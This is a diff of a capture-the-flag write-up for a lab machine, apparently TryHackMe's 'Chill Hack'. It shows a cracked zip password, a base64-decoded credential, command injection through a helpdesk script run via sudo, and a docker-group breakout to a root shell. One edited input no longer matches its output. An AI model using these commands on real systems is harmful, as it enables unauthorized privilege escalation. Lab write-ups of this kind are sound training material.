@@ -206,6 +206,7 @@ I managed to get a file called backup.zip, but when I tried to unzip it, it aske
 <figure><img src="chill-hack-10.png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="chill-hack-11.png" alt=""><figcaption></figcaption></figure>
+
 I managed to discover the password `pass1word` and now I can unzip the file. I found a file called `source_code.php`, inside this file I noticed that there is a password encoding using base64.
 
 <figure><img src="chill-hack-12.png" alt=""><figcaption></figcaption></figure>
@@ -219,28 +220,9 @@ $ echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
 
 <figure><img src="chill-hack-13.png" alt=""><figcaption></figcaption></figure>
 
-## Privilege Escalation
-
-Once I run `id` I noticed that this user is in a docker group. I was able to take advantage of this to escalate privilege to get root.
-
-https://gtfobins.github.io/gtfobins/docker/#shell
-
-```
-$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-```
-
-<figure><img src="chill-hack-14.png" alt=""><figcaption></figcaption></figure>
+## Login as apaar
 
 
-```
-www-data@ip-10-64-134-207:/home$ sudo -l
-Matching Defaults entries for www-data on ip-10-64-134-207:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on ip-10-64-134-207:
-    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
-```
 
 ```
 www-data@ip-10-64-134-207:/home$ cat /home/apaar/.helpline.sh
@@ -259,6 +241,21 @@ $msg 2>/dev/null
 echo "Thank you for your precious time!"
 ```
 
+## Privilege Escalation
+
+Once I run `id` I noticed that this user is in a docker group. I was able to take advantage of this to escalate privilege to get root.
+
+https://gtfobins.github.io/gtfobins/docker/#shell
+
+```
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+<figure><img src="chill-hack-14.png" alt=""><figcaption></figcaption></figure>
+
+
+
+
 
 ```
 www-data@ip-10-64-134-207:/home$ bash /home/apaar/.helpline.sh
@@ -266,7 +263,7 @@ www-data@ip-10-64-134-207:/home$ bash /home/apaar/.helpline.sh
 Welcome to helpdesk. Feel free to talk to anyone at any time!
 
 Enter the person whom you want to talk with: test
-Hello user! I am a,  Please enter your message: ping 192.168.183.77
+Hello user! I am a,  Please enter your message: ping 192.168.130.101 -c 4
 PING 192.168.183.77 (192.168.183.77) 56(84) bytes of data.
 64 bytes from 192.168.183.77: icmp_seq=1 ttl=62 time=127 ms
 64 bytes from 192.168.183.77: icmp_seq=2 ttl=62 time=126 ms
